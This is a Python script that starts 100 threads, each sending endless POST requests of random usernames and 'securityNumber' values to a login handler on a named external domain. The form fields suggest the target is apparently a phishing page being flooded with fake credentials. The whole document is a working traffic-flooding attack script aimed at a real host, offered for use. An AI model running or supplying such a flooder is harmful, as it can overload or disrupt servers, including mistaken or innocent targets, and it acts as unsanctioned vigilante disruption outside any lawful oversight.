from asyncio import threads
import random
import threading
from urllib import response
import requests

x = 0
num = 1000000

url = ('https://payee.cancellation94.com/files/action.php?type=login')

def do_request():
    while True:
        username = str(random.randint(100000000000, 999999999999))
        password = str(random.randint(10000, 99999))

        x = requests.post(url, data={
            'ip': '82.132.228.222',
            'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
            'username': username,
            'securityNumber': password,
            'rememberme': 'on',
            'disable-pwd-mgr-1': 'disable-pwd-mgr-1',
            'disable-pwd-mgr-2': 'disable-pwd-mgr-2',
        })
        print(x)
        print('username: '+username+' | password: '+password)

threads = []

for i in range(100):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for i in range(100):
    threads[i].start()

for i in range(100):
    threads[i].join()
